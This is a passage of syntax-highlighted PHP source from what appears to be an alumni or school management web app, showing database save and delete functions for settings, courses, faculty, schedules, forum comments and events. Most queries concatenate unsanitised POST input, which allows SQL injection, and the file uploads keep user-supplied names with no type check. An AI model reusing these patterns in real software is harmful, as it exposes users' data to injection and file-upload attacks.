                        <span class="k">if</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span><span class="p">){</span>
                                                        <span class="nv">$fname</span> <span class="o">=</span> <span class="nb">strtotime</span><span class="p">(</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;y-m-d H:i&#39;</span><span class="p">))</span><span class="o">.</span><span class="s1">&#39;_&#39;</span><span class="o">.</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
                                                        <span class="nv">$move</span> <span class="o">=</span> <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span><span class="s1">&#39;assets/uploads/&#39;</span><span class="o">.</span> <span class="nv">$fname</span><span class="p">);</span>
                                                        <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, avatar = &#39;</span><span class="si">$fname</span><span class="s2">&#39; &quot;</span><span class="p">;</span>

                        <span class="p">}</span>
                        <span class="nv">$save_alumni</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;UPDATE alumnus_bio set </span><span class="si">$data</span><span class="s2"> where id = &#39;</span><span class="si">{</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;bio&#39;</span><span class="p">][</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#39; &quot;</span><span class="p">);</span>
                        <span class="k">if</span><span class="p">(</span><span class="nv">$data</span><span class="p">){</span>
                                <span class="k">foreach</span> <span class="p">(</span><span class="nv">$_SESSION</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
                                        <span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$key</span><span class="p">]);</span>
                                <span class="p">}</span>
                                <span class="nv">$login</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">login2</span><span class="p">();</span>
                                <span class="k">if</span><span class="p">(</span><span class="nv">$login</span><span class="p">)</span>
                                <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
                        <span class="p">}</span>
                <span class="p">}</span>
        <span class="p">}</span>

        <span class="k">function</span> <span class="nf">save_settings</span><span class="p">(){</span>
                <span class="nb">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
                <span class="nv">$data</span> <span class="o">=</span> <span class="s2">&quot; name = &#39;&quot;</span><span class="o">.</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;&#39;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;#x2019;&quot;</span><span class="p">,</span><span class="nv">$name</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39; &quot;</span><span class="p">;</span>
                <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, email = &#39;</span><span class="si">$email</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, contact = &#39;</span><span class="si">$contact</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, about_content = &#39;&quot;</span><span class="o">.</span><span class="nb">htmlentities</span><span class="p">(</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;&#39;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;#x2019;&quot;</span><span class="p">,</span><span class="nv">$about</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&#39; &quot;</span><span class="p">;</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span><span class="p">){</span>
                                                <span class="nv">$fname</span> <span class="o">=</span> <span class="nb">strtotime</span><span class="p">(</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;y-m-d H:i&#39;</span><span class="p">))</span><span class="o">.</span><span class="s1">&#39;_&#39;</span><span class="o">.</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
                                                <span class="nv">$move</span> <span class="o">=</span> <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span><span class="s1">&#39;assets/uploads/&#39;</span><span class="o">.</span> <span class="nv">$fname</span><span class="p">);</span>
                                        <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, cover_img = &#39;</span><span class="si">$fname</span><span class="s2">&#39; &quot;</span><span class="p">;</span>

                <span class="p">}</span>

                <span class="c1">// echo &quot;INSERT INTO system_settings set &quot;.$data;</span>
                <span class="nv">$chk</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM system_settings&quot;</span><span class="p">);</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$chk</span><span class="o">-&gt;</span><span class="na">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
                        <span class="nv">$save</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;UPDATE system_settings set &quot;</span><span class="o">.</span><span class="nv">$data</span><span class="p">);</span>
                <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                        <span class="nv">$save</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;INSERT INTO system_settings set &quot;</span><span class="o">.</span><span class="nv">$data</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$save</span><span class="p">){</span>
                <span class="nv">$query</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM system_settings limit 1&quot;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">fetch_array</span><span class="p">();</span>
                <span class="k">foreach</span> <span class="p">(</span><span class="nv">$query</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
                        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$key</span><span class="p">))</span>
                                <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;settings&#39;</span><span class="p">][</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
                <span class="p">}</span>

                        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
                                <span class="p">}</span>
        <span class="p">}</span>


        <span class="k">function</span> <span class="nf">save_course</span><span class="p">(){</span>
                <span class="nb">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
                <span class="nv">$data</span> <span class="o">=</span> <span class="s2">&quot; course = &#39;</span><span class="si">$course</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, description = &#39;</span><span class="si">$description</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                        <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$id</span><span class="p">)){</span>
                                <span class="nv">$save</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;INSERT INTO courses set </span><span class="si">$data</span><span class="s2">&quot;</span><span class="p">);</span>
                        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                                <span class="nv">$save</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;UPDATE courses set </span><span class="si">$data</span><span class="s2"> where id = </span><span class="si">$id</span><span class="s2">&quot;</span><span class="p">);</span>
                        <span class="p">}</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$save</span><span class="p">)</span>
                        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">delete_course</span><span class="p">(){</span>
                <span class="nb">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
                <span class="nv">$delete</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;DELETE FROM courses where id = &quot;</span><span class="o">.</span><span class="nv">$id</span><span class="p">);</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$delete</span><span class="p">){</span>
                        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">save_subject</span><span class="p">(){</span>
                <span class="nb">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
                <span class="nv">$data</span> <span class="o">=</span> <span class="s2">&quot; subject = &#39;</span><span class="si">$subject</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, description = &#39;</span><span class="si">$description</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                        <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$id</span><span class="p">)){</span>
                                <span class="nv">$save</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;INSERT INTO subjects set </span><span class="si">$data</span><span class="s2">&quot;</span><span class="p">);</span>
                        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                                <span class="nv">$save</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;UPDATE subjects set </span><span class="si">$data</span><span class="s2"> where id = </span><span class="si">$id</span><span class="s2">&quot;</span><span class="p">);</span>
                        <span class="p">}</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$save</span><span class="p">)</span>
                        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">delete_subject</span><span class="p">(){</span>
                <span class="nb">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
                <span class="nv">$delete</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;DELETE FROM subjects where id = &quot;</span><span class="o">.</span><span class="nv">$id</span><span class="p">);</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$delete</span><span class="p">){</span>
                        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">save_faculty</span><span class="p">(){</span>
                <span class="nb">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
                <span class="nv">$data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
                <span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">){</span>
                        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$v</span><span class="p">)){</span>
                                <span class="k">if</span><span class="p">(</span><span class="nv">$k</span> <span class="o">!=</span><span class="s1">&#39;id&#39;</span><span class="p">){</span>
                                        <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span>
                                        <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot; </span><span class="si">$k</span><span class="s2">=&#39;</span><span class="si">{</span><span class="nv">$v</span><span class="si">}</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                                        <span class="k">else</span>
                                        <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, </span><span class="si">$k</span><span class="s2">=&#39;</span><span class="si">{</span><span class="nv">$v</span><span class="si">}</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                                <span class="p">}</span>
                        <span class="p">}</span>
                <span class="p">}</span>
                        <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$id_no</span><span class="p">)){</span>
                                <span class="nv">$i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
                                <span class="k">while</span><span class="p">(</span><span class="nv">$i</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>
                                        <span class="nv">$rand</span> <span class="o">=</span> <span class="nb">mt_rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">99999999</span><span class="p">);</span>
                                        <span class="nv">$rand</span> <span class="o">=</span><span class="nb">sprintf</span><span class="p">(</span><span class="s2">&quot;%&#39;08d&quot;</span><span class="p">,</span><span class="nv">$rand</span><span class="p">);</span>
                                        <span class="nv">$chk</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM faculty where id_no = &#39;</span><span class="si">$rand</span><span class="s2">&#39; &quot;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">num_rows</span><span class="p">;</span>
                                        <span class="k">if</span><span class="p">(</span><span class="nv">$chk</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">){</span>
                                                <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, id_no=&#39;</span><span class="si">$rand</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                                                <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                                        <span class="p">}</span>
                                <span class="p">}</span>
                        <span class="p">}</span>

                <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$id</span><span class="p">)){</span>
                        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$id_no</span><span class="p">)){</span>
                                <span class="nv">$chk</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM faculty where id_no = &#39;</span><span class="si">$id_no</span><span class="s2">&#39; &quot;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">num_rows</span><span class="p">;</span>
                                <span class="k">if</span><span class="p">(</span><span class="nv">$chk</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
                                        <span class="k">return</span> <span class="mi">2</span><span class="p">;</span>
                                        <span class="k">exit</span><span class="p">;</span>
                                <span class="p">}</span>
                        <span class="p">}</span>
                        <span class="nv">$save</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;INSERT INTO faculty set </span><span class="si">$data</span><span class="s2"> &quot;</span><span class="p">);</span>
                <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$id_no</span><span class="p">)){</span>
                                <span class="nv">$chk</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM faculty where id_no = &#39;</span><span class="si">$id_no</span><span class="s2">&#39; and id != </span><span class="si">$id</span><span class="s2"> &quot;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">num_rows</span><span class="p">;</span>
                                <span class="k">if</span><span class="p">(</span><span class="nv">$chk</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
                                        <span class="k">return</span> <span class="mi">2</span><span class="p">;</span>
                                        <span class="k">exit</span><span class="p">;</span>
                                <span class="p">}</span>
                        <span class="p">}</span>
                        <span class="nv">$save</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;UPDATE faculty set </span><span class="si">$data</span><span class="s2"> where id=&quot;</span><span class="o">.</span><span class="nv">$id</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$save</span><span class="p">)</span>
                        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">delete_faculty</span><span class="p">(){</span>
                <span class="nb">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
                <span class="nv">$delete</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;DELETE FROM faculty where id = &quot;</span><span class="o">.</span><span class="nv">$id</span><span class="p">);</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$delete</span><span class="p">){</span>
                        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">save_schedule</span><span class="p">(){</span>
                <span class="nb">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
                <span class="nv">$data</span> <span class="o">=</span> <span class="s2">&quot; faculty_id = &#39;</span><span class="si">$faculty_id</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, title = &#39;</span><span class="si">$title</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, schedule_type = &#39;</span><span class="si">$schedule_type</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, description = &#39;</span><span class="si">$description</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, location = &#39;</span><span class="si">$location</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$is_repeating</span><span class="p">)){</span>
                        <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, is_repeating = &#39;</span><span class="si">$is_repeating</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                        <span class="nv">$rdata</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;dow&#39;</span><span class="o">=&gt;</span><span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="nv">$dow</span><span class="p">),</span><span class="s1">&#39;start&#39;</span><span class="o">=&gt;</span><span class="nv">$month_from</span><span class="o">.</span><span class="s1">&#39;-01&#39;</span><span class="p">,</span><span class="s1">&#39;end&#39;</span><span class="o">=&gt;</span><span class="p">(</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d&#39;</span><span class="p">,</span><span class="nb">strtotime</span><span class="p">(</span><span class="nv">$month_to</span> <span class="o">.</span><span class="s1">&#39;-01 +1 month - 1 day &#39;</span><span class="p">))));</span>
                        <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, repeating_data = &#39;&quot;</span><span class="o">.</span><span class="nb">json_encode</span><span class="p">(</span><span class="nv">$rdata</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39; &quot;</span><span class="p">;</span>
                <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                        <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, is_repeating = 0 &quot;</span><span class="p">;</span>
                        <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, schedule_date = &#39;</span><span class="si">$schedule_date</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, time_from = &#39;</span><span class="si">$time_from</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, time_to = &#39;</span><span class="si">$time_to</span><span class="s2">&#39; &quot;</span><span class="p">;</span>

                <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$id</span><span class="p">)){</span>
                        <span class="nv">$save</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;INSERT INTO schedules set &quot;</span><span class="o">.</span><span class="nv">$data</span><span class="p">);</span>
                <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                        <span class="nv">$save</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;UPDATE schedules set &quot;</span><span class="o">.</span><span class="nv">$data</span><span class="o">.</span><span class="s2">&quot; where id=&quot;</span><span class="o">.</span><span class="nv">$id</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$save</span><span class="p">)</span>
                        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">delete_schedule</span><span class="p">(){</span>
                <span class="nb">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
                <span class="nv">$delete</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;DELETE FROM schedules where id = &quot;</span><span class="o">.</span><span class="nv">$id</span><span class="p">);</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$delete</span><span class="p">){</span>
                        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">get_schecdule</span><span class="p">(){</span>
                <span class="nb">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
                <span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
                <span class="nv">$qry</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM schedules where faculty_id = 0 or faculty_id = </span><span class="si">$faculty_id</span><span class="s2">&quot;</span><span class="p">);</span>
                <span class="k">while</span><span class="p">(</span><span class="nv">$row</span><span class="o">=</span><span class="nv">$qry</span><span class="o">-&gt;</span><span class="na">fetch_assoc</span><span class="p">()){</span>
                        <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;is_repeating&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>
                                <span class="nv">$rdata</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;repeating_data&#39;</span><span class="p">]);</span>
                                <span class="k">foreach</span><span class="p">(</span><span class="nv">$rdata</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span><span class="nv">$v</span><span class="p">){</span>
                                        <span class="nv">$row</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$v</span><span class="p">;</span>
                                <span class="p">}</span>
                        <span class="p">}</span>
                        <span class="nv">$data</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;</span>
                <span class="p">}</span>
                        <span class="k">return</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">delete_forum</span><span class="p">(){</span>
                <span class="nb">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
                <span class="nv">$delete</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;DELETE FROM forum_topics where id = &quot;</span><span class="o">.</span><span class="nv">$id</span><span class="p">);</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$delete</span><span class="p">){</span>
                        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">save_comment</span><span class="p">(){</span>
                <span class="nb">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
                <span class="nv">$data</span> <span class="o">=</span> <span class="s2">&quot; comment = &#39;&quot;</span><span class="o">.</span><span class="nb">htmlentities</span><span class="p">(</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;&#39;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;#x2019;&quot;</span><span class="p">,</span><span class="nv">$comment</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&#39; &quot;</span><span class="p">;</span>

                <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$id</span><span class="p">)){</span>
                        <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, topic_id = &#39;</span><span class="si">$topic_id</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                        <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, user_id = &#39;</span><span class="si">{</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;login_id&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                        <span class="nv">$save</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;INSERT INTO forum_comments set &quot;</span><span class="o">.</span><span class="nv">$data</span><span class="p">);</span>
                <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                        <span class="nv">$save</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;UPDATE forum_comments set &quot;</span><span class="o">.</span><span class="nv">$data</span><span class="o">.</span><span class="s2">&quot; where id=&quot;</span><span class="o">.</span><span class="nv">$id</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$save</span><span class="p">)</span>
                        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">delete_comment</span><span class="p">(){</span>
                <span class="nb">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
                <span class="nv">$delete</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;DELETE FROM forum_comments where id = &quot;</span><span class="o">.</span><span class="nv">$id</span><span class="p">);</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$delete</span><span class="p">){</span>
                        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">save_event</span><span class="p">(){</span>
                <span class="nb">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
                <span class="nv">$data</span> <span class="o">=</span> <span class="s2">&quot; title = &#39;</span><span class="si">$title</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, schedule = &#39;</span><span class="si">$schedule</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, content = &#39;&quot;</span><span class="o">.</span><span class="nb">htmlentities</span><span class="p">(</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;&#39;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;#x2019;&quot;</span><span class="p">,</span><span class="nv">$content</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&#39; &quot;</span><span class="p">;</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;banner&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span><span class="p">){</span>
